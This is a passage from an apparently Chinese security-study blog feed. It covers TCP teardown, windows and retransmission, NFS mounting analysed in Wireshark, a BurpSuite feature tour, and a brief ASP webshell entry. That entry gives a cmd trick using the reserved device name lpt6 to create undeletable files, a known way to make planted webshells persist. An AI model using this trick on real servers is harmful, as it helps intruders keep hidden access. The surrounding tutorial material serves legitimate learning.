2、服务器收到客户端发来的数据包后，发送一个ACK数据包来回应客户端。
3、服务器再向客户端传输一个自己的FIN/ACK数据包。
4、客户端收到服务器的FIN/ACK数据包后，再向服务器发送一个ACK数据包，之后就结束通信过程。
</code></pre><p>下面我们结合Lab8-3.pcap来看一下TCP断开的过程：<br><img src="/2017/03/28/TCP与UDP协议详解/8.jpg" alt="8"><br>通过查看第一个数据包的标志位可以发现，IP地址为67.228.110.120的设备通过发送含有FIN/ACK标志位的数据包来开启TCP断开的过程。接下来目标设备使用了一个ACK数据包来确认收到了数据包，并且发送了一个FIN/ACK数据包。最后，IP地址为67.228.110.120的设备发送了最后的ACK数据包后，宣告TCP正式断开。那么这两个设备之间的TCP通信就已经结束了，如果想要再继续进行通信，则必须完成新的握手操作。  </p>
<p>##TCP的重置<br>正常情况下，TCP通信的连接都会以TCP的四次握手断开。但是现实中，网络连接有时会出现断掉的情况。这有可能是遭受到了网络攻击，也有可能是出现了配置错误的情况。此时就需要使用设置了RST标志的TCP数据包，表示出现了连接被异常终止或拒绝连接的请求。这里我们结合Lab8-4.pcap实验文件进行讲解：<br><img src="/2017/03/28/TCP与UDP协议详解/9.jpg" alt="9"><br>这个文件中的第一个数据包是从192.168.100.138发出的，并且尝试与192.168.100.1的80端口进行通信。但是由于目标主机并没有开启80端口，因此在第二个数据包中，就回应了一个RST数据包，告诉源主机80端口无法建立连接，那么通信也就终止了。由此可见，RST数据包可以在通信序列的开始或者在主机通信的过程中，将通信终止。  </p>
<p>##UDP数据包分析<br>UDP指的是User Datagram Protocol，即用户数据报协议，是在现代网络中最常使用的另外一种第四层的协议。如果说TCP是为了满足带有内在错误检测的可靠数据传输，那么UDP主要是为了提供高速的传输。出于这个原因，UDP是一种尽力服务，通常会被称为无连接协议。一个无连接协议并不会正式地建立和结束主机之间的连接，也不会像TCP那样存在握手和终止的过程。</p>
<p>无连接协议意味着它是一种不可靠的服务，这将使得UDP的流量一点都不稳定。但依赖于UDP的协议通常都会有其它的可靠性服务，或者使用ICMP的一些功能来保证连接更可靠一些。比如，应用层协议DNS和DHCP需要高度依赖数据包在网络上的传输速度，因此需要使用UDP协议，并利用它们自身的错误检查以及重传计时来保证数据的正确传输。 这里我们看一下Lab8-5.pcap这个实验文件：<br><img src="/2017/03/28/TCP与UDP协议详解/10.jpg" alt="10"><br>可以看到，这个捕获文件是由DNS形成的。而UDP的内容也很简单，包含有源端口、目标端口、数据报的长度以及校验和等信息。</p>
<p>需要强调的是，UDP并不关心传输的可靠性，所以任何使用UDP的应用在必要的时候都需要采取特殊的步骤，从而保证传输的可靠性。  </p>
<p>##TCP与UDP数据包的捕获<br>最后我们再来尝试在网络上捕获真实的TCP与UDP数据包进行分析。这里我们可以采用上次课程中所讲过的方法，专门捕获TCP数据包。比如这里我们可以利用浏览器打开“i春秋”主页，并进行抓包，生成Lab8-6.pcapng这个文件。</p>
<p>由于捕获的数据包比较多，因此我们可以首先进行筛选。比如可以通过“Edit”-&gt;“Find Packet”，在弹出的对话框中以String的形式搜索字符串“ichunqiu”，那么可以找到一个HTTP协议的数据包。根据这个，我们就可以知道源IP地址以及目标IP地址，于是接下来就可以利用筛选器，输入筛选条件：<br>ip.addr==172.21.79.153 &amp;&amp; ip.addr==61.135.185.105<br>那么剩下的就是这两个IP地址之间的流量了。下面我们尝试寻找TCP的三次握手，当然这可以根据数据包中seq以及ack的值进行匹配，比如4号数据包中seq的值为3958928431，而17号数据包的ack值为3958928432，于是就可以知道这两个数据包分别是第一和第二次TCP握手。而第18个数据包的seq的值也是3958928432，那么其实我们就已经找到了TCP的三次握手。 或者我们可以通过着色的形式将这些相关的数据包高亮显示。</p>
<p>使用鼠标右键单击4号数据包，依次选择“Colorize Conversation”-&gt;“TCP”-&gt;“Color 1”（可按照自己的喜好选择颜色），于是Wireshark中的数据包就得到了高亮显示：<br><img src="/2017/03/28/TCP与UDP协议详解/11.jpg" alt="11"><br>很明显，第4、17以及18号数据包就是TCP的三次握手。然后我们可以把这三个数据包导出来，选择“File”-&gt;“Export Specified Packets”，在弹出的对话框中给文件起一个名字，我这里是Lab8-6-handshake.pcapng，之后在“Range”后面的输入框中填上“4,17,18”，选择“保存”，那么只包含有三个数据包的捕获文件就生成了。</p>
<p>或者我们也可以在想要保存的数据包上单击鼠标右键，选择“Mark Packet(toggle)”，然后在导出窗口中选择“Marked packet”即可。</p>
<p>如果要捕获UDP的数据包，最简单的可以通过登录QQ的方式来进行抓取，因为比较简单，这里不再赘述。</p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 协议篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[TCP中也有一个窗口]]></title>
        <url>https://517736522.github.io/2017/03/28/TCP%E4%B8%AD%E4%B9%9F%E6%9C%89%E4%B8%80%E4%B8%AA%E7%AA%97%E5%8F%A3/</url>
        <content type="html"><![CDATA[<p>##TCP知识补遗<br>在讲解TCP窗口的知识之前，关于TCP数据包还有几个知识点是需要补充讲解一下的。这里我们打开实验文件Lab9-1.pcap：<br><img src="/2017/03/28/TCP中也有一个窗口/1.jpg" alt="1"><br>在之前的课程中我曾经讲过，TCP提供有序的数据传输，因此每个数据段都要标上一个序列号，也就是Seq的值。这样当接收方收到乱序的数据包时，就可以根据这个序列号进行重新排序了。这里我们并不需要知道Seq的起始值是怎么计算的，但是必须要理解这个值的增长方式。如上图所示，1号数据包Seq的值为4131969696，这个数据包的长度，也就是Len的值为1448，那么2号数据包的Seq的值就应当是4131969696+1448=4131971144，与2号数据包的Seq值是吻合的。可见，Seq的值是依据上一个数据包的Seq值加上长度得来的。这个Seq值是由这两个数据包的发送方，也就是10.32.106.159维护的。</p>
<p>由于TCP是双向的，一个连接中的双方都可以是数据的发送方，所以双方各自都会维护一个Seq值，上图中的1、2、4、5号数据包有自己的Seq值，而3号和6号数据包的Seq值则是由10.32.106.62维护的。3号数据包Seq的值为735349110，Len的值为0，所以6号数据包的Seq值依旧是735349110。</p>
<p>这里需要注意的是，比如1号数据包的Len的值为1448，但是这个长度是不包括TCP头的长度的。而3号和6号数据包的Len的值尽管为0，但其实这里面是包含有TCP头的。TCP头部包含有丰富的信息，因此大家千万不要误以为Len的值是0就没有意义，其实Len是0的情况还是很常见的。</p>
<p>然后我们回过头再看一下2号数据包。这里它发送了“Seq=4131971144，Len=1448”的数据包，那么当对方收到这个数据包之后，应当回复的确认号，也就是Ack的值就应该是4131971144+1448=4131972592，意味着已经收到了4131972592之前的所有字节数据。而我们看到3号数据包的Ack的值与此是吻合的，说明网络传输是正常的。事实上，接收方所回复的Ack的值其实就是发送方的下一个Seq的值，所以我们可以看到4号数据包的Seq的值也等于4131972592。</p>
<p>这里需要注意的是，3号数据包是对2号数据包成功接收的确认，但是为什么没有收到1号数据包的确认数据包呢？其实3号数据包在确认4131972592的时候，就说明了序列号小于4131972592的所有字节都收到了，也就相当于确认了1号数据包里面所包含的数据，可见TCP的确认是可以累加的。</p>
<p>在TCP连接中，因为双方都可以是接收方，所以他们各自除了会维护各自的Seq值以外，还会维护各自的Ack的值，由于在第3和第6号数据包中，10.32.106.62并未发送任何实质性的数据，也就是Len的值为0，于是接收方，也就是10.32.106.159的Ack的值就没有任何变化。</p>
<p>这些参数对于我们学习网络分析是很重要的。因为一旦将这些原理和概念了然于胸，那么接下来对于TCP的深入学习，理解TCP更加深层次的特性就会有事半功倍的效果。比如如果数据包出现了乱序的情况，那么接收方只要依据Seq的值从小到大进行排列就可以了，这样就保证了数据传输的有序性。或者当出现了丢包的情况，接收方只要通过前一个Seq+Len的值再减去下一个Seq的差，就可以判断丢了哪些包。可以举一个例子，假设10.32.106.62并未收到2号数据包，那么这里可以先计算一下1号数据包的Seq+Len的值，即4131971144，再减去下一个数据包的Seq，结果是1448，那么就可以知道有Len=1448的数据包丢失了。那么这就保证了TCP数据传输的可靠性。  </p>
<p>##TCP窗口的原理<br>在TCP协议中，实现了滑动窗口的机制，可以用来检测什么时候发生了数据包的丢失，并且调整数据的传输速率以避免丢失情况的加剧。滑动窗口机制利用数据接收方的接收窗口来对数据流进行控制。</p>
<p>接收窗口是数据接收方自己依照实际情况而定下来的值，保存在TCP的头部信息中。这个值告诉了发送方自己希望在TCP缓冲空间中保存多少数据。这个缓冲空间是数据在可以向上传递到等待处理数据的应用层协议之前的临时存储空间。所以，发送方一次只可以发送Window Size所指定的数据量。而为了传输更多的数据，接收方必须要发送确认数据包，表示之前的数据已经接收到了。同时也必须要处理占用着TCP缓冲区的数据，从而清空缓冲区，以接收新的数据。下图则对此进行了说明：<br><img src="/2017/03/28/TCP中也有一个窗口/2.jpg" alt="2"><br>在上图中，客户端（发送方）正在向接收窗口大小为5000字节的服务器（接收方）发送数据。首先发送了2500字节，于是服务器可用的缓存空间就减少到了2500字节。接下来客户端又发送了2000字节，于是缓冲区就剩下了500字节。此时服务器发送数据确认的数据包，并处理缓存空间，于是得到了空的缓冲区。那么接下来的过程与上面的类似，客户端又发送了3000字节以及1000字节，从而将缓冲区减少到了1000字节。服务器再次对这些数据进行确认，并处理缓冲区的内容。  </p>
<p>##TCP窗口的调整<br>真实的网络环境中，数据的接收方往往需要对窗口的大小进行调整，毕竟接收方往往并不能够及时地处理缓冲区中的数据。 当一台繁忙的服务器需要处理来自多个客户端的数据包时，服务器清空缓冲区的速度就会减慢，从而无法腾出更多的缓冲区来接收数据。如果此时对网络流量不进行控制，就会导致数据包的丢失和损坏，因此，调整接收窗口的大小就很有必要了。也就是在回复ACK数据包时，同时告诉发送方，减小窗口的大小，如下图所示：<br><img src="/2017/03/28/TCP中也有一个窗口/3.jpg" alt="3"><br>在上图中，服务器一开始声明的窗口大小是5000字节。客户端发送了2000字节，接下来又发送了2000字节，于是就剩下了1000字节的缓存空间。服务器发现如果客户端再这样发送数据，那么自己的缓冲空间就会被塞满，那么就会导致数据包的丢失。为了避免这个问题，服务器向客户端发送了一个确认数据包，里面也包含了新的窗口的大小为1000字节。于是，客户端就会减少发送的数据量，服务器可以按照能够接受的速率处理缓冲区的内容，保证网络的健康运行。那么当服务器处理完缓冲区中的数据，就可以考虑利用确认数据包，指定更大的窗口大小。  </p>
<p>##TCP的零窗口<br>在有些情况下，服务器可能无法处理客户端发送的数据，比如服务器出现故障等的情况。此时仅仅减小窗口的大小是不行，而需要将接收窗口的值直接设置为零值。也就是通过ACK数据包告诉客户端，窗口的大小是0，让客户端停止所有的数据传输，但是仍然会通过“保活数据包”来保持与服务器的连接。客户端会周期性地发送这样的数据包，以检测服务器的接收窗口的状态。一旦服务器排除了故障，能够再次处理数据，那么就会向客户端发送一个非零的窗口大小以恢复通信。下图展示了这个原理：<br><img src="/2017/03/28/TCP中也有一个窗口/4.jpg" alt="4"><br>在上图中，服务器开始用5000字节的窗口接收数据。在从客户端接收到了两次2000字节的数据包之后，服务器出现了问题，无法再次处理来自客户端的数据。那么此时服务器就会发送一个ACK数据包，告诉客户端，窗口大小变成了0。于是客户端就暂停了数据的传输，接下来就给服务器发送保活数据包。在服务器解决了自身的问题之后，就会给客户端发送一个窗口大小非零的数据包，告诉客户端新的窗口大小为1000字节，于是客户端就可以继续发送数据了。  </p>
<p>##TCP滑动窗口数据包分析<br>下面我们通过分析几个实际的例子来看一下TCP的滑动窗口机制。打开实验文件Lab9-2.pcap：<br><img src="/2017/03/28/TCP中也有一个窗口/5.jpg" alt="5"><br>这里我们主要关注的是Window Size的值，这个值可以通过查看数据包的Info列得出。可以发现，在前三个数据包中，这个值是在不断地缩小的。也就是从第一个数据包的8760减小到5840，再减小到2920，之后变成了0。窗口不断减小，是主机延迟增加的典型表现。此时注意一下Time列的值，可见窗口的缩小是在极短的时间内发生的。</p>
<p>第四个数据包是由数据的接收方发往数据的发送方的，目的是告诉对方自己不再接收任何数据。当自己的缓冲区数据处理完后，就告诉数据的发送方，自己的窗口大小变为了64240，可以继续接收数据了，于是接下来就恢复了数据的传输。 接下来我们再分析一下Lab9-3.pcap文件。可以看到，第一个数据包是一个正常的HTTP数据包，但是紧接着的2号数据包却是一个通知窗口为0的数据包：<br><img src="/2017/03/28/TCP中也有一个窗口/6.jpg" alt="6"><br>与上一个实验文件所不同的是，接下来数据的接收方并没有发送窗口恢复的通知。所以数据的发送方只能不断地发送保活数据包来进行检查，可以看到捕获文件中的第3、5、7号数据包都是保活数据包，而数据接收方的回应全都是窗口值为0。 如果大家的Wireshark并没有标记出保活数据包，那么可以选择菜单栏的“Edit”-&gt;”Preferences”-&gt;”Protocols”-&gt;”TCP”，勾选“Analyze TCP sequence numbers”即可：<br><img src="/2017/03/28/TCP中也有一个窗口/7.jpg" alt="7"><br>那么此时的零窗口数据包以及保活数据包就全都标记出来了。</p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 协议篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[asp小马界面]]></title>
        <url>https://517736522.github.io/2017/03/28/asp%E6%9C%A8%E9%A9%AC%E7%AE%80%E4%BB%8B/</url>
        <content type="html"><![CDATA[<p>##asp小马界面<br><img src="/2017/03/28/asp木马简介/1.jpg" alt="1"><br><img src="/2017/03/28/asp木马简介/2.jpg" alt="2"><br>用于上传文件  </p>
<p>##asp大马界面<br><img src="/2017/03/28/asp木马简介/3.jpg" alt="3"><br>扫描端口，更改文件等等<br>不死僵尸原理：利用了系统保留关键字<br><img src="/2017/03/28/asp木马简介/4.jpg" alt="4"><br>进入cmd<br>输入copy test.txt \\.\C:\lpt6.test.txt<br>生成的lpt6.test.txt不能删除，复制，读取<br>删除命令为 del \\.\C:\lpt6.test.txt  </p>
]]></content>
        
        <categories>
            
            <category> 信息安全 </category>
            
            <category> asp安全 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[TCP重传技术的研究]]></title>
        <url>https://517736522.github.io/2017/03/28/TCP%E9%87%8D%E4%BC%A0%E6%8A%80%E6%9C%AF%E7%9A%84%E7%A0%94%E7%A9%B6/</url>
        <content type="html"><![CDATA[<p>##TCP重传的原理<br>在TCP重传的理论中，重传计时器是用于决定是否有必要进行数据包重传的一个主要机制。重传计时器维护着一个叫做重传超时（Retransmission timeout，RTO）的值。在使用TCP进行数据包的传送时，重传计时器就会被启动。当收到数据包的ACK，也就是确认数据包时，计时器就会停止。从发送数据包到接收到确认数据包的时间，被称作往返时间（Round-trip time，RTT）。我们将若干个往返时间求和并计算平均值，就可以得出最终的RTO值。</p>
<p>但是在最终计算出RTO值之前，数据的传输操作将会一直依赖于默认的RTT值。这个设置用于主机之间的初始通信，并基于接收到的数据包的RTT进行调整，从而形成真正的RTO值。</p>
<p>一旦RTO值被确定下来，重传计时器就被应用于每个传输的数据包，从而确定数据包是否丢失，如下图所示：<br><img src="/2017/03/28/TCP重传技术的研究/1.jpg" alt="1"><br>当数据包发送出去，但是接收方没有发送TCP ACK数据包时，发送方就假设原来发送的数据包并没有发送到目标主机，认为它丢失了，于是就进行重传。重传之后，RTO的值翻倍；如果在到达极限值之前依旧没有收到ACK数据包，那么就会进行第二次重传。如果还是没有收到ACK，那么RTO的值就会再次翻倍。那么每次的重传，都会导致RTO的值翻倍，直至收到ACK数据包，或者发送方达到配置的最大重传次数为止。当然我这里所说的每次进行翻倍，是为了便于大家的理解，实际上在计算RTO的时候，是需要几个公式的，这里不做深入研究。一般来说，Windows操作系统会重传5次，而Linux则为15次。这个次数是可以进行修改的。</p>
<p>下面我们来研究一下Lab10-1.pcap这个实验文件，这个文件中包含了TCP重传的情况。可以看到，第一个数据包是一个正常的TCP PSH/ACK数据包，其中的PSH表示Push操作，也就是指当数据包到达接收端后，立刻传送给应用程序，而不是在缓冲区中排队。那么接下来，在正常的情况下，当接收端接收到第一个数据包之后，往往很快就可以看到用于响应的TCP ACK数据包。但是这里的第二个数据包却是一个TCP Retransmission数据包，表明这是一个重传：<br><img src="/2017/03/28/TCP重传技术的研究/2.jpg" alt="2"><br>而且接下来的几个数据包也都是重传数据包。这里请大家注意的是，重传数据包和第一个数据包相比，它们的Data区段，也就是所传输数据的主体内容，是完全一致的。如果我们展开查看Packet Details面板中的TCP，还可以发现相应的RTO的值等信息，并且这个RTO与每个数据包的发送时间是相吻合的，呈指数增长。  </p>
<p>##TCP的快速重传<br>如果接收方接收到了乱序的数据包，就发送重复的TCP ACK数据包。TCP在其头部使用序号和确认字段，以确保数据被可靠接收并以发送的顺序进行重组。我们上次课说过，Seq序列号可以帮助数据进行有序的传输。</p>
<p>如果接收方遇到不符合顺序的序列号，就知道数据包丢失了。那么为了正确地重组数据，接收方必须要得到丢失的数据包，因此接收方会发送一个包含丢失数据包序列号的ACK数据包，这样发送方就可以知道应该发送哪一个数据包了。以下图为例：<br><img src="/2017/03/28/TCP重传技术的研究/3.jpg" alt="3"><br>如果发送方收到3个来自接收方的重复ACK时，发送方就会假设这个数据包确实在传输的过程中丢失了，于是就立刻发起快速重传的机制。一旦触发了快速重传，其它所有正在传输的数据包都要先暂停发送，直到把丢失的数据包发送出去为止。为什么要规定凑满三个重复ACK数据包呢？我的理解是，网络数据包有些时候在传输的过程中会出现乱序的情况，乱序的数据包一样会触发重复ACK数据包，但是由于出现乱序而重传没有必要。由于一般的乱序的距离不会相差太大，比如3号数据包也许会到5号数据包的后面，但是不太可能跑到7号数据包的后面，所以限定成3个或者以上，就可以在很大的程度上避免由于乱序而导致的快速重传。</p>
<p>这里我们分析一下实验文件Lab10-2.pcap：<br><img src="/2017/03/28/TCP重传技术的研究/4.jpg" alt="4"><br>我们首先看一下第一个数据包，这个TCP ACK数据包是从数据的接收方发往数据的发送方的，是对前一个数据包的确认。从Ack的值可以知道，接收方目前已经收到了1之前的所有数据，而这个值也应当是接收的下一个数据包的Seq号。然后看一下第二个数据包：<br><img src="/2017/03/28/TCP重传技术的研究/5.jpg" alt="5"><br>可以发现，这个数据包的Seq的值是10945，并不是我们希望看到的1，这就说明了数据在传输的过程中出现了丢包的情况。当接收方发现这个问题之后，就会向发送方发送一个重复的ACK数据包：<br><img src="/2017/03/28/TCP重传技术的研究/6.jpg" alt="6"><br>接下来的第4个数据包依旧是发送方所发送的数据，并且依旧是错误的Seq号，于是接收方发送第二个重复ACK数据包，接下来发送方又发送了一个错误的数据包，于是接收方再回复一个重复ACK数据包。</p>
<p>由于发送方收到了三个重复的ACK数据包，那么就会停止所有数据的发送工作，并重新发送丢失的数据包，也就是第8个数据包的内容：<br><img src="/2017/03/28/TCP重传技术的研究/7.jpg" alt="7"><br>可以看到，这里已经标出了这个数据包就是一个快速重传数据包，其大小为1368。那么下一个数据包就是对这个快速重传数据包的回应，从Ack=1369可以知道，已经接收到了1369之前的所有数据。  </p>
<p>##多个数据包丢失的情况<br>最后我们再讨论一个比较复杂的情况，也就是丢失了多个数据包的情况。假设发送方一共发送了8个数据包，但是其中的2号和3号数据包丢失了，而1、4、5、6、7、8号数据包都抵达了接收方，并且触发了Ack 2，也就是通知发送方，没收到2号数据包。对于发送方来说，只能通过Ack 2知道2号数据包丢失了，但是并不知道还有哪些数据包丢失了。那么在重传了2号数据包之后，接下来应该传哪一个呢？有以下三种方案： 方案1：把3、4、5、6、7、8号数据包重传一次。这是最简单直接的办法，但是这个丢包的后果导致了多个数据包被重传，效率是非常低的。其实早期的TCP协议就是这样处理的。 方案2：接收方收到重传过来的2号包之后，会回复一个Ack 3，这样发送方就可以知道3号数据包也丢失了，于是传送3号包。这样当接收方收到重新传送过来的3号包之后，由于所有的数据包都收到了，就回复一个Ack 9，那么发送方就可以从9号数据包开始发送数据了。这个方案被称为NewReno，在RFC2582和RFC3782中被定义。NewReno的方法虽然说比较完善，但是在丢包量很大的时候，就需要花费多个往返时间来重传所有丢失的数据包。 方案3：接收方在请求重传2号包的时候，顺便把收到的数据包号告诉发送方。所以网络上数据的传输过程因该是这样的： 在收到4号数据包时，告诉发送方已经收到4号，但是2号没收到。 在收到5号数据包时，告诉发送方已经收到4、5号，但是2号没收到…… 这样一来，发送方就可以对丢包的细节了如指掌，在快速重传了2号数据包之后，它可以接着传3号，然后再传9号数据包。这种方案被称为SACK，在RFC2018中被定义。</p>
<p>这里我们依旧看一下实验文件Lab10-2.pcap，查看一下它的第3个重复的ACK数据包，在Packet Detail面板中，展开TCP中的Options，查看一下SACK的内容：<br><img src="/2017/03/28/TCP重传技术的研究/8.jpg" alt="8"><br>可以看到，SACK后面的值为5473-15049，表示序列号为5473到15049的数据已经接收到了，结合Ack=1，那么发送方就知道序列号为1到5472的数据没收到，于是接下来就发送这些数据。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 协议篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[burpsuite功能详解]]></title>
        <url>https://517736522.github.io/2017/03/28/burpsuite%E5%8A%9F%E8%83%BD%E8%AF%A6%E8%A7%A3/</url>
        <content type="html"><![CDATA[<p>###1、BurpSuite的应用场景  </p>
<p>###2、burpSuite的安装和功能模块简介  </p>
<p>###3、Proxy功能模块详解  </p>
<p>###4、Repeater功能模块详解  </p>
<p>###5、Intruder功能模块详解  </p>
<p>###6、Scanner功能模块详解  </p>
<p>###7、Options功能模块详解  </p>
<p>###8、其他功能模块详解  </p>
<p>##BurpSuite的应用场景<br><img src="/2017/03/28/burpsuite功能详解/1.jpg" alt="1"><br>proxy-Options选项卡中有过滤History的功能<br><img src="/2017/03/28/burpsuite功能详解/2.jpg" alt="2">  </p>
<p>##burpSuite的安装和简介<br>1.需要java环境，jre<br>2.下载burp<br>3.启动burp<br>spider爬虫<br>Scanner扫描<br>intruder暴力破解<br>Repeater重放攻击<br>sequencer分析序列，例如获取1万个cookie分析随机性<br>decoder解密<br>comparer文件对比  </p>
<p>##proxy代理模块详解<br>proxy-Option选项卡下，设置监听器<br><img src="/2017/03/28/burpsuite功能详解/3.jpg" alt="3"><br>过滤器<br><img src="/2017/03/28/burpsuite功能详解/4.jpg" alt="4"><br>Forward通过<br>drop丢弃<br><img src="/2017/03/28/burpsuite功能详解/5.jpg" alt="5"><br>可设置拦截什么<br><img src="/2017/03/28/burpsuite功能详解/6.jpg" alt="6"><br>修改监听端口<br><img src="/2017/03/28/burpsuite功能详解/7.jpg" alt="7">  </p>
<p>###Burp的透明代理</p>
<p>更多信息 请看上面链接中的2.2.1和2.2.2部分。老实说，跟着这整个系列来看Burp怎么作为代理来工作，你将会避免出现许多问题。</p>
<p>如果我们代理了一个代理敏感的客户端，它将会在实际启用TLS传输前发送连接请求给想要连接的目标。这会通知代理该往哪重定向流量。这是因为代理无法看到TLS层加密的TCP流量包。由于不知道怎么处理流量，CONNECT解决了这个问题。代理敏感的客户端会把代理视为浏览器。</p>
<p>非代理敏感的客户端就不在意他们的流量是否经过了代理。大多数这种程序都不使用代理设置或系统代理设置。程序依旧认为它在节点间直接发送流量，并没有被重定向到Burp。Burp可以将TLS层的数据代理并解密数据包，在包中通过头中的host字段找到原始节点。这就是Burp的透明代理。</p>
<p>可以在Proxy &gt; Options开启。选择代理监听，点击编辑，在Request Handling 中选择Support invisible proxying (enable only if needed)。</p>
<p>我经常用它来捕获应用和Burp之间的本地流量，判断应用是否发送连接请求。另一种方法是都尝试一下，看哪个好使。</p>
<p>###证书</p>
<p>我们可以配置Burp的中间人证书。</p>
<pre><code>Use a self-signed certificate意味着Burp只能使用单一证书
Geneate CA-signed per-host certificates是最常用的，Burp将会针对不同的host生成不同的证书。证书的CN和域名相同。
Generate a CA-signed certificate with a specific hostname这里我们可以指定证书的CN。当一个应用通过检查CN来锁定时就有用了，但是这与终端节点常用的通配符不太一样。
Use a custom certificate (PKCS#12) 如果我们有确定的证书需要使用，我们可以在这里修改。当证书检查机制并不只是检查CN，我们就需要手动输入证书。
</code></pre><p>##Repeater重放<br><img src="/2017/03/28/burpsuite功能详解/8.jpg" alt="8">  </p>
<p>##intruder攻击<br><img src="/2017/03/28/burpsuite功能详解/9.jpg" alt="9"><br>支持断点中继<br><img src="/2017/03/28/burpsuite功能详解/10.jpg" alt="10">  </p>
<p>###攻击类型：<br>sniper对每个参数可进行统一设置,一个参数发完再来另一个参数变化<br>battering ram对每个参数可进行统一设置，全部参数同时变化<br>pitchfork对每个参数可进行逐个设置，然后同时变化（不同点不同payload)<br><img src="/2017/03/28/burpsuite功能详解/11.jpg" alt="11"><br>如果有一个攻击点的payload攻击完成，那么整个攻击会结束<br>cluster bomb对每个参数可进行逐个设置，然后逐个变化（不同点不同payload)<br><img src="/2017/03/28/burpsuite功能详解/12.jpg" alt="12">    </p>
<p>###payloads:<br><img src="/2017/03/28/burpsuite功能详解/13.jpg" alt="13"><br>内置字典包含多种功能，xss sql …  </p>
<p>###options:<br><img src="/2017/03/28/burpsuite功能详解/14.jpg" alt="14"><br>可设置线程、连接失败重试次数、再次连接暂停多少时间、访问频率<br><img src="/2017/03/28/burpsuite功能详解/15.jpg" alt="15"><br>可设置提示回应数据里的自定义关键字（支持正则）<br><img src="/2017/03/28/burpsuite功能详解/16.jpg" alt="16"><br><img src="/2017/03/28/burpsuite功能详解/17.jpg" alt="17"><br><img src="/2017/03/28/burpsuite功能详解/18.jpg" alt="18"><br>提取特定位置字符  </p>
<p>##Scanner漏洞扫描<br><img src="/2017/03/28/burpsuite功能详解/19.jpg" alt="19"><br>分主动扫描，被动扫描<br>主动扫描：会主动设置payload发包，根据结果分析漏洞<br>被动扫描：只检查历史中的应答包，分析漏洞<br><img src="/2017/03/28/burpsuite功能详解/20.jpg" alt="20"><br><img src="/2017/03/28/burpsuite功能详解/21.jpg" alt="21"><br><img src="/2017/03/28/burpsuite功能详解/22.jpg" alt="22"><br>定义分析的范围<br><img src="/2017/03/28/burpsuite功能详解/23.jpg" alt="23">  </p>
<p>##options  </p>
<p>###misc<br>logging生成日志文件  </p>
<p><img src="/2017/03/28/burpsuite功能详解/24.jpg" alt="24"><br>自动任务  </p>
<p><img src="/2017/03/28/burpsuite功能详解/25.jpg" alt="25"><br>显示设置，编码等  </p>
<p>Connections可编写表单网页，扫描漏洞时有用  </p>
<p>http</p>
<p>ssl代理证书</p>
<p>sessions可管理cookie<br><img src="/2017/03/28/burpsuite功能详解/26.jpg" alt="26">   </p>
<p>##spider爬虫<br><img src="/2017/03/28/burpsuite功能详解/27.jpg" alt="27">    </p>
<p>##sequencer序列分析<br><img src="/2017/03/28/burpsuite功能详解/28.jpg" alt="28">    </p>
<p>统计学的一些东西  </p>
]]></content>
        
        <categories>
            
            <category> 信息安全 </category>
            
            <category> burpsuite </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[linux中的NFS协议解析]]></title>
        <url>https://517736522.github.io/2017/03/28/linux%E4%B8%AD%E7%9A%84NFS%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90/</url>
        <content type="html"><![CDATA[<p>##NFS协议的挂载<br>这里我们结合着Wireshark来分析一下NFS协议数据，来学习一下它的挂载过程、安全机制以及读写过程，以直观的方式进行学习。首先分析一下协议的挂载，实验文件Lab18-1.pcap就是在执行挂载命令（mount）时所捕获的数据包：<br><img src="/2017/03/28/linux中的NFS协议解析/1.jpg" alt="1"><br>上图中，IP地址为10.32.106.159是客户端，10.32.106.62则为服务器端，我们逐条分析一下每个数据包：</p>
<p>1：客户端想连接服务器的NFS进程，于是询问应该使用哪个端口（GETPORT）。在这里我们可以看到“Reply In 2”，说明2号数据包就是对于这个数据包的回应。</p>
<p>2：服务器回应说，NFS端口是2049。那么这里的“Call In 1”说明本数据包是对于1号数据包询问的回应。</p>
<p>3：客户端尝试连接服务器的NFS进程。并且还可以判断2049端口是否被防火墙拦截，以及NFS服务是否已经启动。</p>
<p>4：服务器回应，收到请求，可以连接上。</p>
<p>5：客户端想连接服务器的挂载（mount）服务，询问该服务的端口。由于mount服务的端口号是比较随机的，因此客户端必须要进行询问。</p>
<p>6：服务器回应自己的mount服务端口为1234。</p>
<p>7：客户端尝试连接mount进程。同理，也可以判断1234号端口是否被防火墙所拦截，还有mount进程是否已经成功启动。</p>
<p>8：服务器回应收到请求，可以连接。</p>
<p>9：客户端提出要求，请求挂载（MNT）“/code”这个共享目录。NFS主要提供了/code以及/document两个共享目录，分别被挂载到多台客户端的本地目录上。当用户在这些本地目录进行文件的读写时，实际上是在NFS的服务器上进行的。</p>
<p>10：服务器同意了客户端的请求。通过查看Packet Details面板可以知道，服务器要求客户端使用file handle 0x75a18429进行目录的访问。</p>
<p>11：客户端尝试客户端的NFS进程是否能连接上。</p>
<p>12：服务器回应可以连接。其实这两步完全没有必要，因为NFS一直处于连接的状态。这个问题估计和我们之前讨论的Windows中FTP的主动和被动模式一样，是开发人员的疏忽造成的。如果他们当时能够熟练使用Wireshark进行测试，相信不会出现这样的问题。</p>
<p>13：客户端要求查看文件句柄为0x75a18429的文件的属性。</p>
<p>14：服务器为客户端提供了该文件系统的大小和空间使用率等属性，之后就可以在客户端看到这些信息了。</p>
<p>15：客户端要求查看文件句柄为0x75a18429的文件的属性。</p>
<p>16：服务器为客户端提供该文件的属性。那么很明显，这两步也是多余的操作，估计原因同上。</p>
<p>这里需要说明的是，为了便于大家的理解与观察，这个捕获文件中只保留了关键步骤，而删去了关系不太大的数据包。大家如果分析真实的场景，所捕获到的数据包会比这复杂很多，但是原理是一致的。</p>
<p>利用Wireshark就可以很清晰地看到，如果portmap请求没有得到回复，这就说明很可能是防火墙对相关端口进行了拦截；如果发现mount请求被服务器拒绝了，那么可以考虑检查一下共享目录的访问设置。  </p>
